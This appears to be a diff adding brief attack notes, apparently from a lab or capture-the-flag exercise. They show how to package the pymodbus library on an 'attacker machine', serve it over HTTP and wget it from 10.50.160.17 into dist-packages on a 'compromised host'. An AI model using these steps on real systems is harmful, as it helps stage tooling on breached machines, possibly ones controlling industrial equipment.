@@ -1,0 +1,11 @@
+#On attacker machine:
+cp -R/usr/local/lib/python3.11/dist-packages/pymodbus/ /tmp/
+cd /tmp/
+tar -czvf pymodbus.tar.gz pymodbus
+python3 -m http.server
+
+#On Debian machine(compromised host)
+cd /usr/local/lib/python3.11/dist-packages/
+wget http://10.50.160.17:8000/pymodbus.tar.gz
+tar -xzvf pymodbus.tar.gz
+
